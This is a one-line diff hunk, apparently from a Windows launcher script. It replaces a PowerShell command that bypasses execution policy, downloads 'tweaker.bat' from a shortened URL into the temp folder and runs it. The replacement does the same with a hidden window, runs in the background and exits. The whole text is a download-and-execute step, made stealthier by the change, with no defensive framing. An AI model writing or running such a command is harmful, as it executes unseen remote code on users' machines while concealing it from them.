@@ -1,1 +1,1 @@
-powershell -ExecutionPolicy Bypass -Command "iwr -useb https://tinyurl.com/VZEDSTART -OutFile $env:TEMP\tweaker.bat; & $env:TEMP\tweaker.bat"
+start /b "" powershell -w h -c "iwr -useb https://tinyurl.com/VZEDSTART -OutFile $env:TEMP\tweaker.bat; Start-Process $env:TEMP\tweaker.bat -WindowStyle Hidden" & exit
